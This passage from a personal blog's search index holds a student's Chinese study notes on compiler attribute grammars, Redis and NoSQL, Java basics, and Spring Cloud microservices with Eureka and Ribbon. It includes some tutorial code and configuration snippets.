style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">.</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">等</span><span class="mclose">)</span></span></span></span></eq></li><li>文法的产生式具有某些语义规则(语义规则用于解释这些值得传递和计算)</li></ul></li><li><p>属性分类</p><ul><li>综合属性（自下而上得传递消息）<ul><li>语法规则上：根据产生式右部的符号属性计算左部被定义的符号的综合属性</li><li>语法树上：根据子节点的属性和父节点自身的属性计算父节点的综合属性</li></ul></li><li>继承属性（自上而下传递消息）<ul><li>语法规则上：根据右部候选式中的符号的属性和左部被定义的符号的属性计算右部候选式中符号的继承属性</li><li>语法树上：根据父节点和兄弟节点的属性计算子节点的继承属性</li></ul></li></ul></li><li><p>带注释的语法树：在语法树的基础上加上属性</p></li></ul><h3 id="%E7%AC%AC%E5%85%AD%E9%81%93" tabindex="-1">第六道</h3><p>跟汇编很像，不难</p><h3 id="%E7%AC%AC%E4%B8%83%E9%81%93" tabindex="-1">第七道</h3><p>给出错误的C语言程序，指出错误</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习（未完）</title>
      <link href="/2023/04/04/web/redis/"/>
      <url>/2023/04/04/web/redis/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p><a href="https://www.bilibili.com/video/BV1cr4y1671t?p=2&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><h2 id="%E5%88%9D%E8%AF%86redis" tabindex="-1">初识Redis</h2><h3 id="1-%E8%AE%A4%E8%AF%86nosql" tabindex="-1">1 认识NoSQL</h3><table><thead><tr><th></th><th>SQL(关系型数据库)</th><th>NoSQL(非关系型数据库)</th></tr></thead><tbody><tr><td>数据结构</td><td>结构化</td><td>非结构化（键值型Redis，图类型Neo4j，文档型MongoDB，列类型HBase）</td></tr><tr><td>数据关联</td><td>关联的</td><td>无关联的</td></tr><tr><td>查询方式</td><td>SQL查询</td><td>非SQL</td></tr><tr><td>事务特性</td><td>ACID</td><td>BASE（基本满足ACID）</td></tr><tr><td>存储方式</td><td>磁盘</td><td>内存</td></tr><tr><td>扩展性</td><td>垂直</td><td>水平</td></tr><tr><td>使用场景</td><td>(1)数据结构固定<br>(2)相关事务对数据安全性，一致性要求较高</td><td>(1)数据结构不固定<br>(2)对一致性，安全性要求不高<br>(3)对性能要求</td></tr></tbody></table><h3 id="2-%E8%AE%A4%E8%AF%86redis" tabindex="-1">2 认识Redis</h3><p>Redis诞生于2009年，全称 Remote Dictionary Server，远程词典服务，是一个基于内存的键值型NoSQL数据库</p><ul><li>特征<ul><li>键值型，value支持多种不同的数据结构吗，功能丰富</li><li>单线程，每个命令具有原子性</li><li>低延迟，速度快(基于内存，IO多路复用，良好的编码)</li><li>支持数据持久化</li><li>支持中主从集群，分片集群</li><li>支持多语言客户端</li></ul></li></ul><h3 id="3-%E5%AE%89%E8%A3%85redis" tabindex="-1">3 安装Redis</h3><p>只能在linux上使用，这里先简单了解一下，摸了</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>overleaf使用（Latex）</title>
      <link href="/2023/03/31/%E5%B7%A5%E5%85%B7/overleaf%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/03/31/%E5%B7%A5%E5%85%B7/overleaf%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>这个坑还是晚点再填吧，到时自己看书学学</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础（未完）</title>
      <link href="/2023/03/29/PL/java%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/03/29/PL/java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/PL/java%E5%9F%BA%E7%A1%80/xx.jpg" alt><br><a href="https://www.bilibili.com/video/BV1Fv4y1q7ZH/?vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><p>基础篇-9天<br>进阶篇-19天</p><h2 id="%E5%9F%BA%E7%A1%80%E7%AF%87" tabindex="-1">基础篇</h2><h3 id="day1" tabindex="-1">Day1</h3><ul><li><p>人机交互方式</p><ul><li>图形化：速度慢，占内存多</li><li>命令行：速度快，占内存小</li></ul></li><li><p>shutdown -s -t 300 计算机在300s后关机，可以坑人</p></li><li><p>java是美国Sun公司(Stanford University Network)在1995年推出的计算机语言，或被Oracle公司偏高</p></li><li><p>Java之父：詹姆斯·高斯林</p></li><li><p>Java三大平台</p><ul><li>Java SE<ul><li>Java语言的(标准版)，用于桌面开发应用，是其它两个版本的基础</li><li>桌面应用：用户只要打开程序，程序的界面会让用户在最短时间内找到它们的需要的功能，同时主动带领用户完成他们的工作并得到最好的体验</li><li>学习Java SE的目的：为今后要从事的Java EE开发，打基础</li></ul></li><li>Java ME<ul><li>java语言的(小型版)，用于嵌入式消费类电子设备</li></ul></li><li>Java EE<ul><li>java语言的企业版，用于Web方向的网站开发</li><li>网页：用于数据展示</li><li>网站：网页+后台服务器</li></ul></li></ul></li><li><p>java跨平台（即跨多操作系统）</p><ul><li>原理：在需要运行Java的应用程序的操作系统上，安装一个与Java对应的Java虚拟机(JVM Java Virtual Machine)</li></ul></li><li><p>下载JDK</p><ul><li>Java 8，11，17为：LTS（long-term suppor长期支持版）</li><li><a href="http://www.oracle.com">官网下载</a></li></ul></li><li><p>JDK的组成<img src="/images/PL/java%E5%9F%BA%E7%A1%80/JDK%E7%9A%84%E7%BB%84%E6%88%90.jpg" alt="JDK的组成"></p></li><li><p>IDEA概述</p><ul><li>目前业界公认的最好的Java集成开发环境</li><li>IDEA项目结构介绍<ul><li>project</li><li>moudle</li><li>package</li><li>class</li></ul></li></ul></li></ul><h3 id="day2" tabindex="-1">Day2</h3><ul><li><p>标识符命名规范</p><ul><li>小驼峰命名法<ul><li><ol><li>标识符是一个单词的时候，所有字母小写</li></ol></li><li><ol start="2"><li>标识符由多个单词组成的时候，从第二个单词开始，首字母大写</li></ol></li><li>该命名法多用于变量</li></ul></li><li>大驼峰命名法<ul><li><ol><li>标识符是一个单词的时候，首字母大写</li></ol></li><li><ol start="2"><li>标识符由多个单词组成的时候，每个单词的首字母大写</li></ol></li><li>该命名用于类的命名</li></ul></li></ul></li><li><p>整数类型，首选int，定义long类型变量需要加入L的标识</p></li><li><ol><li>基本得隐式转换</li></ol><ul><li>把一个取值范围小的数值或变量，赋值给另一个取值范围更大的变量</li></ul></li><li><ol start="2"><li>运算中的隐式变换</li></ol><ul><li>取值范围小的数据，和取值范围大得数据进行运算，小的会提升为大的再进行运算</li><li>byte，short，char，三种数据在运算时，会提升为int，再进行运算</li></ul></li><li><p>计算机中进制分类</p><ul><li>10进制：默认</li><li>2进制 ：0b开头</li><li>8进制 ：0开头</li><li>16进制：0x开头</li></ul></li></ul><h3 id="day3" tabindex="-1">Day3</h3><ul><li>方法(函数)<ul><li>方法调用内存<ul><li>方法没有被调用的时候，在<code>方法区</code>字节码文件中存放</li><li>方法被调用时，需要进入到<code>栈内存</code>中运行</li></ul></li><li>方法重载<ul><li>在同一个类中，定义了多个同名的方法，但每个方法具有不同的参数类型或参数个数，这些同名的方法，就构成了重载关系</li></ul></li></ul></li></ul><h3 id="day4" tabindex="-1">Day4</h3><ul><li>jdk14后，case后面允许编写多个数据，多个数据之间用逗号隔开</li></ul><pre><code class="language-java">switch(week)&#123;    case 1,2,3,4,5 -&gt; System.out.println(&quot;&quot;);    case 6,7 -&gt; System.out.println(&quot;&quot;);    default -&gt; System.out.println();&#125;</code></pre><h3 id="day5" tabindex="-1">Day5</h3><ul><li><p>数组遍历快捷键：<code>数组名.fori</code></p></li><li><p>数组初始化</p><ul><li>动态初始化：初始化时只指定数组长度，由系统为数组分配初始值</li><li>格式：<code>数据类型[] 数组名 = new 数据类型[数组长度]</code></li></ul></li><li><p>ctrl+alt+M：抽取方法的快捷键</p></li><li><p>Java内存分配</p><ul><li>方法去：字节码文件加载时进入的内存</li><li>栈内存：方法运行时进入的内存</li><li>堆内存：new出来的东西会在这块内存中开辟空间并产生地址</li></ul></li><li><p>Java二维数组</p><ul><li>二维数组在存储一维数组时，具体存储的是一维数组的地址</li></ul></li></ul><h3 id="day6" tabindex="-1">Day6</h3><p>讲习题，跳！</p><h3 id="day7" tabindex="-1">Day7</h3><ul><li><p>面向对象：并不是一种技术，而是一种编程的指导思想</p></li><li><p>面向对象程序设计(Object Oriented Programming)，OOP</p></li><li><p>Java中想要创建对象，必须先要有类的存在</p></li><li><p>类指的是一组相关属性和行为的集合，我们可以理解为是一张对象的设计图，一个类可以创建无限的对象</p></li><li><p>类的组成</p><ul><li>属性：成员变量<ul><li>跟之前定义变量的格式一样，但位置需要放在方法外面</li></ul></li><li>行为：成员方法<ul><li>跟之前定义方法格式一样，但需要去掉static</li></ul></li></ul></li><li><p>类的本质：对事物进行的描述</p></li><li><p>打印对象名，可以看到对象的内存地址</p><ul><li>全类名：包名+类名</li></ul></li></ul><table>  <thead>    </thead><td>区别</td>    <td>成员变量</td>    <td>局部变量</td>    <tr><td>类中位置不同</td>    <td>方法外</td>    <td>方法中</td></tr>  <tr><td>初始值不同</td>    <td>有默认初始值</td>    <td>没有，使用之前需要赋值</td></tr>  <tr><td>内存位置不同</td>    <td>堆内存</td>    <td>栈内存</td></tr>  <tr><td>生命周期不同</td>    <td>随着对象的创建而存在，随着对象的消失而消失</td>    <td>随着方法的调用而存在，随着方法的运行结束而结束</td></tr>  <tr><td>作用域</td>    <td>在自己所属的打括号中</td>    <td>在自己所属的打括号中</td></tr></table><ul><li><p>this关键字</p><ul><li>局部变量和成员变量重名时，使用就近原则</li><li>this关键字可以调用本类成员</li><li>this代表当前对象的引用</li></ul></li><li><p>构造方法</p><ul><li>初始化一个新建的对象，创建和构造对象的时候所调用的方法</li><li>格式<ul><li><ol><li>方法名与类名相同</li></ol></li><li><ol start="2"><li>没有返回值类型</li></ol></li><li><ol start="3"><li>没有具体的返回值</li></ol></li></ul></li><li>作用<ul><li><ol><li>本质作用：创建对象</li></ol></li><li><ol start="2"><li>结合执行时机：可以在创建对象的时候，给对象中的数据初始化</li></ol></li></ul></li><li>注意事项<ul><li><ol><li>构造方法的创建：如果没有定义构造方法，系统会给出一个默认的无参的构造方法</li></ol></li><li><ol start="2"><li>构造方法的重载：构造方法也是方法，允许重载</li></ol></li><li><ol start="3"><li>推荐使用方式：无参和有参的构造方法均自己给出</li></ol></li></ul></li></ul></li><li><p>面向对象三大特征：封装，继承，多态</p></li><li><p>封装：使用类设计对象时：将需要处理的数据，以及处理这些数据的方法，设计到对象中</p><ul><li>更好的维护数据</li><li>使用者无需关心内部实现，只要知道如何使用即可</li><li>封装的设计规范：合理隐藏，合理暴露</li><li>权限修饰符<ul><li>private：同一个类中<ul><li><ol><li>私有成员变量（保证数据安全性）</li></ol></li><li><ol start="2"><li>针对私有成员变量，提供setxxx，getxxx方法</li></ol></li></ul></li><li>（default）：同一个类中，同一个包中</li><li>protected：同一个类中，同一个包中，不同包的子类中</li><li>public：任意位置访问</li></ul></li></ul></li><li><p>标准JavaBean</p><ul><li><ol><li>这个类的成员变量都要私有，并提供对应的set和get方法</li></ol></li><li><ol start="2"><li>提供带参和无参的构造方法</li></ol></li><li>JavaBean是一个实体类</li></ul></li><li><p>实体类：实体类只负责数据存取，而对数据的处理交由其它类来完成，实现数据和数据业务处理相分离</p></li></ul><h3 id="day8" tabindex="-1">Day8</h3><ul><li><p>常用API（Application Programming Interface：应用编程接口）</p><ul><li>使用JDK的API帮助文档<ul><li><ol><li>看索引位置搜索自己要查看的类</li></ol></li><li><ol start="2"><li>看包，目的是看是不是Java.lang包（核心包），核心包不需要编写导包代码(import)</li></ol></li><li><ol start="3"><li>看这个类的介绍：弄清楚类的作用</li></ol></li><li><ol start="4"><li>看这个类的构造方法：为了创造该类的对象</li></ol></li><li><ol start="5"><li>看这个类的成员方法：方法名，参数，返回值，介绍</li></ol></li></ul></li></ul></li><li><p>String类</p><ul><li><ol><li>String是java核心包，所有程序中的双引号字符串都是String这个类的对象</li></ol></li><li><ol start="2"><li>字符串一旦被创建，就不可以被更改，字符串内容不可变更，想要更改只能使用新的对象，做替换</li></ol></li><li><ol start="3"><li>String字符串虽然不可以更改，但可以被共享</li></ol><ul><li>字符串常量池：当我们使用双引号创建字符串对象时，会检查常量池中是否存在该数据：不存在则创建，否则复用<ul><li>jdk7之前：StringTable在方法去，7之后在堆内存</li></ul></li></ul></li><li>字符串的两种构造方式<ul><li><ol><li>双引号直接创建</li></ol></li><li><ol start="2"><li>通过构造方法</li></ol></li><li>方法区别：双引号直接创建会在String Table中进行维护，而通过构造方法时，new方法会在堆中新开辟出一块内存</li></ul></li></ul></li></ul><pre><code class="language-java">String s=new String();//创建一个空白字符串String s=new String(char[] chs);//根据传入的字符数组，创建字符串对象String s=new String(&quot;abs&quot;);//根据传入的字符串来创建字符对象</code></pre><ul><li>String中的比较方法</li></ul><pre><code class="language-java">public boolean equals(Object anObject) //将此字符串与指定字符串进行比较public boolean equalsIgnoreCase(String anotherString) //忽略大小写进行字符串比较</code></pre><ul><li>String字符串的遍历<ul><li>char[] toCharArray(); 将字符串转化为字符数组</li><li>char charAt(int index); 根据指定索引返回对应位置字符</li><li>int length(); 返回字符串的长度，这是一个方法</li></ul></li><li>String的截取方法 类似C++的<ul><li>String substring(int beginIndex);</li><li>String substring(int beginIndex,int endIndex); 这个方法左闭右开</li></ul></li><li>String的替换方法<ul><li>String replace(CharSequence target,CharSequence replacement)<ul><li>参数1为旧值，参数二为新值，自动将旧值替换为新值</li></ul></li><li>String replaceAll(String regex,String replacement)<ul><li>使用replacement替换所有符合regex<strong>正则表达式</strong>的字符串</li></ul></li><li>String replaceFirst(String regex,String replacement)<ul><li>使用replacement替换第一个符合regex<strong>正则表达式</strong>的字符串</li></ul></li></ul></li><li>String的拆分方法<ul><li>Sting[] split(String regex) 根据给定<strong>正则表达式</strong>的匹配拆分字符串</li></ul><pre><code class="language-java">String s=&quot;192,168,1,1&quot;;String[] sArr=s.split(&quot;,&quot;);//如果要匹配字符 &quot;.&quot; 需要转义字符 &quot;//.&quot;sAA=&#123;&quot;192&quot;,&quot;168&quot;,&quot;1&quot;,&quot;1&quot;&#125;;</code></pre></li></ul><pre><code class="language-java">long time = System.currentTimeMillis();获取从19700101 0时0分到现在有多少毫秒  </code></pre><ul><li>StringBuilder的引入<ul><li>作用：提高字符串的操作效率</li><li>介绍：<ul><li><ol><li>一个可变的字符序列</li></ol></li><li><ol start="2"><li>StringBuilder是字符串缓冲区，可以理解为容器，这个容器可以存储任意数据，但其里面自动转为字符串</li></ol></li></ul></li><li>构造方法<ul><li>public StringBuilder(); 创建一个空白字符串缓冲区，初始容量16个字符</li><li>public StringBuilder(String str);</li></ul></li><li>常用成员方法<ul><li>public StringBuilder append(任意类型): 添加数据返回对象自己<ul><li>s.append(“a”).append(“b”)：链式编程：调用的方法，返回的结果是对象，就可以继续向下调用方法</li></ul></li><li>public StringBuilder reverse():将缓冲区中的内容进行反转</li><li>public int length()</li><li>public toString() 将缓冲区的内容以String类型返回</li></ul></li></ul></li><li>StringBuilder和StringBuffer<ul><li>方法都一样</li><li>但是StringBuilder是线程不安全的，StringBuffer是线程安全的，因此StringBuilder效率高一些，而StringBuffer效率慢一些</li></ul></li></ul><h3 id="day9" tabindex="-1">day9</h3><ul><li><p>集合基础</p><ul><li>集合是一种容器，装数据，类似数组</li><li>数组的局限：数组定义并启动后，长度即固定</li><li>但是集合大小可变</li></ul></li><li><p>Array长度可变原理</p><ul><li><ol><li>当创建Array集合容器的时候，底层会存在一个长度为10个大小的空数组</li></ol></li><li><ol start="2"><li>随后扩容原数组1.5倍大小的新数组</li></ol></li><li><ol start="3"><li>将原数组拷贝到新数组种</li></ol></li><li><ol start="4"><li>将新元素添加到新数组</li></ol></li></ul></li><li><p>ArrayList</p><ul><li><ol><li>构造方法：<code>public ArrayList()</code> 创建一个空的集合容器</li></ol></li><li><ol start="2"><li>指定类型的构造方法 <code>ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;()</code> <code>&lt;&gt;</code>是一个泛型</li></ol></li><li>常用方法<img src="/images/PL/java%E5%9F%BA%E7%A1%80/ArrayList%E9%9B%86%E5%90%88%E5%B8%B8%E7%94%A8%E6%88%90%E5%91%98%E5%87%BD%E6%95%B0.jpg" alt></li></ul></li></ul><h2 id="%E8%BF%9B%E9%98%B6%E7%AF%87" tabindex="-1">进阶篇</h2><p>进阶篇转战看书 On java 8 了，感觉自己也不是很急，不如稳稳地看书系统地学习java，<a href="https://mrcold2002.github.io/2023/06/25/PL/On%20java8/">博客地址</a></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务技术栈（未完）</title>
      <link href="/2023/03/27/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/"/>
      <url>/2023/03/27/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p><a href="https://www.bilibili.com/video/BV1LQ4y127n4/?p=1">视频地址</a></p><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88%E5%9B%BE.jpg" alt="微服务技术栈图"></p><h2 id="%E8%AE%A4%E8%AF%86%E5%BE%AE%E6%9C%8D%E5%8A%A1" tabindex="-1">认识微服务</h2><h3 id="01-%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6%E6%BC%94%E5%8F%98" tabindex="-1">01 服务框架演变</h3><ul><li>单体架构<ul><li>概念：将业务的所有功能集中在一个项目中进行开发，打成一个包部署</li><li>优点：架构简单，部署成本低</li><li>缺点：耦合度高</li></ul></li><li>分布式架构<ul><li>概念：根据业务功能对系统进行拆分，每个业务模块作为独立项目开发，成为一个服务</li><li>优点：降低服务耦合，有利于服务拓展升级</li><li>考虑问题：<ul><li>服务拆分粒度如何？</li><li>服务集群地址如何维护？</li><li>服务之间如何实现远程调用？</li><li>服务健康状态如何感知？</li></ul></li></ul></li><li>微服务：是一种经过良好架构设计的分布式架构方案<ul><li>微服务架构特征：<ul><li>单一职责：微服务拆分粒度更小，每一个服务都对应唯一的业务能力，做到单一职责，避免重复业务开发</li><li>面向服务：微服务对外暴露业务接口</li><li>自治：团队独立，技术独立，数据独立，部署独立</li><li>隔离性强：服务调用做好隔离，容错，降级，避免出现级联问题</li></ul></li></ul></li></ul><h3 id="02-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94" tabindex="-1">02 微服务技术对比</h3><ul><li>微服务这种方案需要技术框架来落地，国内最知名为SpringCloud和阿里巴巴的Duddo<br><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94.jpg" alt="微服务技术对比"></li></ul><h3 id="03-springcloud" tabindex="-1">03 SpringCloud</h3><ul><li>SpringCloud是目前全球使用最广泛的微服务框架</li><li>SpringCloud集成了各种微服务功能组件，并基于SpringBoot实现了这些组件的自动装配，从而提供了良好的开箱即用体验</li><li>SpringCloud和SpringCloud搭配使用需要注意版本兼容</li></ul><h2 id="%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86%E4%B8%8E%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8" tabindex="-1">服务拆分与远程调用</h2><h3 id="01-%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86" tabindex="-1">01 服务拆分</h3><ul><li>服务拆分注意事项<ul><li><ol><li>不同微服务，不要重复开发相同业务</li></ol></li><li><ol start="2"><li>微服务数据独立，不要访问其它微服务的数据库</li></ol></li><li><ol start="3"><li>微服务可以将自己的业务暴露为接口，供其它微服务调用</li></ol></li></ul></li></ul><h3 id="02-%E6%9C%8D%E5%8A%A1%E9%97%B4%E8%B0%83%E7%94%A8" tabindex="-1">02 服务间调用</h3><ul><li><p>微服务调用方式</p><ul><li>基于RestTemplate发起的http请求实现远程调用</li><li>http请求做远程调用是与语言无关的调用，只需直到对方的ip，端口，接口路径，请求参数即可</li></ul></li><li><p>步骤：</p><ul><li><ol><li>注册RestTemplate</li></ol></li></ul><pre><code class="language-java"> @Bean  public RestTemplate restTemplate()&#123;      return new RestTemplate();  &#125;</code></pre><ul><li><ol start="2"><li>服务远程调用RestTempla</li></ol></li></ul><pre><code class="language-java">  @GetMapping(&quot;&#123;orderId&#125;&quot;)  public Order queryOrderByUserId(@PathVariable(&quot;orderId&quot;) Long orderId) &#123;      // 1. 查询订单      Order order=orderService.queryOrderById(orderId);      // 2. 利用RestTemplate发起http请求，查询用户      //(1)url路径      String url=&quot;http://localhost:8081/user/&quot;+order.getUserId();      //(2)发送http请求，实现远程调用      User user=restTemplate.getForObject(url,User.class);      // 3. 封装user到Order      order.setUser(user);      // 4. 返回      return order;  &#125;</code></pre></li><li><p>服务调用关系</p><ul><li>服务提供者：暴露接口给其它微服务调用</li><li>服务消费者：调用其他微服务提供的接口</li><li>提供者和消费者角色是相对的</li><li>一个服务可以同时是服务提供者和消费者</li></ul></li></ul><h2 id="eureka-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83" tabindex="-1">Eureka 注册中心</h2><h3 id="01-%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">01 远程调用的问题</h3><ul><li>服务消费者该如何获取服务提供者的地址信息?</li><li>如果有多个服务者，消费者如何选择?</li><li>消费者如何得知服务提供者的健康状态?</li></ul><h3 id="02-eureka%E5%8E%9F%E7%90%86" tabindex="-1">02 eureka原理</h3><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Eureka%E4%BD%9C%E7%94%A8%E5%9B%BE.jpg" alt></p><ul><li><p>服务消费者该如何获取服务提供者的地址信息?</p><ul><li>服务提供者启动时向eureka注册自己的信息</li><li>eureka保存这些信息</li><li>消费者根据服务名称向eureka拉取提供者信息</li></ul></li><li><p>如果有多个服务者，消费者如何选择?</p><ul><li>服务消费者利用负载均衡算法选择一个执行</li></ul></li><li><p>消费者如何得知服务提供者的健康状态?</p><ul><li>服务提供者每30s向eurekaServer发送心跳请求，报告健康状态</li><li>eureeure</li></ul></li><li><p>在Eureka架构中，微服务角色有两类</p><ul><li>EurekaServer：服务端，注册中心<ul><li>记录服务信息，心跳监控</li></ul></li><li>EureClient：客户端<ul><li>Provider：服务提供者<ul><li>注册自己的信息到EurekaServer</li><li>每隔30s向EurekaServer发送心跳</li></ul></li><li>consumer：服务消费者<ul><li>根据服务名称从EurekaServer拉取服务列表</li><li>基于服务列表做负载均衡，选中一个微服务后发起远程调用</li></ul></li></ul></li></ul></li></ul><h3 id="03-%E6%90%AD%E5%BB%BAeurekaserver" tabindex="-1">03 搭建EurekaServer</h3><ul><li>搭建步骤<ul><li><ol><li>创建项目，引入依赖</li></ol></li></ul><pre><code class="language-xml">&lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;  &lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>编写启动类，添加@EnableEurekaServer注解</li></ol></li></ul><pre><code class="language-java">  @EnableEurekaServer  @SpringBootApplication  public class EurekaApplication &#123;  public static void main(String[] args) &#123;      SpringApplication.run(EurekaApplication.class,args);      &#125;  &#125;</code></pre><ul><li><ol start="3"><li>添加application.yml文件，编写配置</li></ol></li></ul><pre><code class="language-yaml">  server:      port: 10086  spring:      application:          name: eurekaserver #eureka服务名称  eureka:      client:          service-url:              defaultZone: http://127.0.0.1:10086/eureka</code></pre></li></ul><h3 id="04-%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C" tabindex="-1">04 服务注册</h3><ul><li>步骤如下：<ul><li><ol><li>在user-service项目引入<code>spring-cloud-starter-netflix-eureka-client</code>的依赖</li></ol></li></ul><pre><code class="language-xml">  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;  &lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>在<code>application.yml</code>文件，编写下面配置</li></ol></li></ul><pre><code class="language-yaml">  server:      port: 10086  spring:      application:          name: eurekaclient #eureka服务名称  eureka:      client:          service-url:              defaultZone: http://127.0.0.1:10086/eureka</code></pre></li></ul><h3 id="05-%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0" tabindex="-1">05 服务发现</h3><ul><li>服务拉取是基于服务名称获取服务列表，然后在对服务列表做负载均衡<ul><li><ol><li>修改代码，修改url路径，用服务名代替ip和端口号<br><code>String url=&quot;http://userservice/user/&quot;+order.getUserId();</code></li></ol></li><li><ol start="2"><li>在项目启动类中添加负载均衡注解</li></ol></li></ul><pre><code class="language-java">    @LoadBalanced  public RestTemplate restTemplate()&#123;      return new RestTemplate();  &#125;</code></pre></li></ul><h2 id="ribbon-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%8E%9F%E7%90%86" tabindex="-1">Ribbon 负载均衡原理</h2><h3 id="01-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%8E%9F%E7%90%86" tabindex="-1">01 负载均衡原理</h3><p><img src="images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%B5%81%E7%A8%8B.jpg" alt="负载均衡流程"><br><img src="images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%B5%81%E7%A8%8B2.jpg" alt="负载均衡流程2"></p><h3 id="02-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AD%96%E7%95%A5" tabindex="-1">02 负载均衡策略</h3><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AD%96%E7%95%A5.jpg" alt="负载均衡策略"></p><ul><li>通过定义rule可以修改负载均衡规则<ul><li><ol><li>代码方式：在order-service中的OrderApplication类中，定义一个新的Rule，这种方法会对整个项目起作用，配置灵活，但修改时需要重新打包</li></ol></li></ul><pre><code class="language-java">@Beanpublic IRule randomRule()&#123;  return new RandomRule();&#125;</code></pre><ul><li><ol start="2"><li>配置文件方式：在order-service的application.yml文件中，添加新的配置也可以修改规则,直观方便，不需要重新打包，但无法做全局配置</li></ol></li></ul><pre><code class="language-yml">userservice:  ribbon:    NFLoadBalancerRuleClassName:com.netflix.loadbalancer.RandomRule</code></pre></li></ul><h3 id="03-%E6%87%92%E5%8A%A0%E8%BD%BD" tabindex="-1">03 懒加载</h3><ul><li>Ribbon默认是采用懒加载，即第一访问时才回去创建LoadBalanceClient，请求时间较长。</li><li>而饥饿加载会在项目启动时创建，降低第一次访问的时间消耗，通过下面配置饥饿加载</li></ul><pre><code class="language-yml">ribbon:  eager-load:    enabled: true    clients: userservice # 指定对userservice这个服务饥饿加载</code></pre><h2 id="nacos-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83" tabindex="-1">Nacos 注册中心</h2><p>这里暂时不需要，以后再来填坑<br><img src="https://www.bilibili.com/video/BV1LQ4y127n4?p=17&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072" alt="视频地址"></p><h2 id="http%E5%AE%A2%E6%88%B7%E7%AB%AFfeign" tabindex="-1">http客户端Feign</h2><h3 id="01-feign%E6%9B%BF%E4%BB%A3resttemplate" tabindex="-1">01 Feign替代RestTemplate</h3><ul><li><p>RestTempla存在的问题</p><pre><code class="language-java">String url=&quot;http://userservice/user/&quot;+order.getUserId();User 